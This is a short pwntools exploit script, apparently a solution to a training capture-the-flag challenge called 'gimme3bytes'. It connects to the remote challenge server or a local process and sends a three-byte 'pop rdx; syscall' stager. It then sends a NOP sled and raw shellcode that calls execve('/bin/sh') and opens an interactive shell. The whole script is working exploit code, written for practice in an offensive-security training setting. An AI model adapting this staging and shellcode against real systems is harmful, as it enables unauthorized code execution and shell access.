from pwn import *

context.arch = "amd64"

if "REM" in args: 
    r = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
else:
    r = process("./gimme3bytes")
    gdb.attach(r,'''
        b *0x4011e8
        ''')
    input("wait")


asm_code = """
pop rdx
syscall
"""
r.send(asm(asm_code))

r.send(b"\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF7\x48\x83\xC7\x1D\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")

r.interactive()